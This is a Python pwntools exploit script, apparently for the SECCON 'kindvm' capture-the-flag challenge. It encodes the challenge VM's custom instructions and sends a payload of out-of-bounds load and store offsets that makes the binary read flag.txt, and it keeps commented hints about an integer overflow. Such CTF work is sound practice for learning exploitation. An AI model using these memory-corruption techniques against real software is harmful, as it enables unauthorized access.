#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
#  import roputils as rp
from libnum import s2n
import struct
import os
import sys

elfPath = "./kindvm"
libcPath = ""
remoteAddr = "kindvm.pwn.seccon.jp"
remotePort = 12345

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

p = lambda x: struct.pack(">I", x)
pp = lambda x: struct.pack(">H", x)

def ins_load(idx, IDX):
    assert idx <= 7
    return '\x01' + chr(idx) + pp(IDX)

def ins_store(IDX, idx):
    assert idx <= 7
    return '\x02' + pp(IDX) + chr(idx)

def ins_mov(idx1, idx2):
    assert idx1 <= 7
    assert idx2 <= 7
    return '\x03' + chr(idx1) + chr(idx2)

def ins_add(idx1, idx2):
    assert idx1 <= 7
    assert idx2 <= 7
    return '\x04' + chr(idx1) + chr(idx2)

def ins_sub(idx1, idx2):
    assert idx1 <= 7
    assert idx2 <= 7
    return '\x05' + chr(idx1) + chr(idx2)

def ins_halt():
    return '\x06'

def ins_in(idx, cont):
    assert idx <= 7
    return '\x07' + chr(idx) + p(cont)

def ins_out(idx):
    assert idx <= 7
    return '\x08' + chr(idx)

if __name__ == "__main__":
    #  hint1 = '\x09'
    '''
    Nice try! You can analyze vm instruction and execute it!
    Flag file name is "flag.txt".
    '''
    #  hint2 = flat(ins_in(0, 0x7fffffff), ins_in(1, 2), ins_add(0, 1))
    '''
    Nice try! You can cause Integer Overflow!
    The value became minus value. Minus value is important.
    '''

    io.sendlineafter("name : ", "flag.txt\0")

    payload = flat(ins_load(0, 0xffd8), ins_store(0xffdc, 0), ins_halt())
    print payload
    #  DEBUG([0x80487A7, 0x80487C0])
    io.sendlineafter("instruction : ", payload)
    
    io.interactive()
